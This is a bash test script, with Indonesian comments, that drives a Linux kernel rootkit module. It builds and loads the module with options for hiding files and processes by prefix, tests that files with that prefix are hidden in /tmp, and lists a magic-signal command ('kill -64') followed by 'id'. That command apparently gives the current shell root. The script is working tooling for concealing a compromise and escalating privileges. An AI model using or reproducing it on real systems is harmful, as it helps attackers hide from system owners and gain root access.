#!/usr/bin/env bash
# test.sh — uji rootkit di VPS (butuh root + headers). Idempotent, aman.
set -u
cd "$(dirname "$0")"

KO="rootkit.ko"
PREFIX="rk_"
MAGIC=64

need_root() {
  if [ "$(id -u)" != "0" ]; then echo "butuh root: sudo ./test.sh"; exit 1; fi
}

case "${1:-all}" in
  build)
    make ;;
  load)
    need_root
    rmmod rootkit 2>/dev/null || true
    insmod "$KO" hide_prefix="$PREFIX" proc_prefix="$PREFIX" sig_magic="$MAGIC" hide_module=0
    dmesg | tail -n 15 ;;
  hide)
    need_root
    touch "/tmp/${PREFIX}rahasia.txt"
    echo -n "ls tanpa filter: "; ls /tmp | grep -c "$PREFIX" || true
    echo "rmmod dulu bila modul hide aktif, lalu insmod hide_module=0 untuk uji ini" ;;
  unload)
    need_root
    rmmod rootkit || true
    dmesg | tail -n 5 ;;
  all)
    make
    echo "OK build. Lanjut manual sebagai root:"
    echo "  sudo insmod $KO hide_module=0; touch /tmp/${PREFIX}x; ls /tmp | grep $PREFIX"
    echo "  kill -$MAGIC \$\$; id"
    echo "  sudo rmmod rootkit" ;;
esac
